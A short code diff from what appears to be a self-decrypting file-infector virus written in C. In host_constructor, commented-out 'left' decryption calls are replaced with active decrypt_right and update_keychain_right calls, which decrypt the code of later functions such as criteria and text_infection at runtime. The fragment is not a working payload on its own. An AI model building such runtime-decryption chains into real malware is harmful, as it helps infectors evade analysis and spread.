@@ -6,11 +6,11 @@
 
 void host_constructor(struct s_host *host, struct s_keychain *keychain, char *filename, enum e_context context)
 {
-//	decrypt_left(keychain, (char *)find_host, (void *)host_constructor - (void *)find_host);
-
 #if LOGGER 
 	ENTRY_LOGGER("host_constructor:\t");
 #endif
+
+	decrypt_right(keychain, (char *)find_host, (void *)host_constructor - (void *)find_host);
 
 	if (context == FAILURE)
 		goto label;
@@ -40,8 +40,8 @@ void host_constructor(struct s_host *host, struct s_keychain *keychain, char *fi
 label:
 	_close(fd);
 
-//	update_keychain_left(keychain, (char *)host_constructor, (void *)criteria - (void *)host_constructor);
-//	decrypt_left(keychain, (char *)criteria, (void *)text_infection - (void *)criteria);
+	update_keychain_right(keychain, (char *)host_constructor, (void *)criteria - (void *)host_constructor);
+	decrypt_right(keychain, (char *)criteria, (void *)text_infection - (void *)criteria);
 
 	criteria(host, keychain, context);
 }
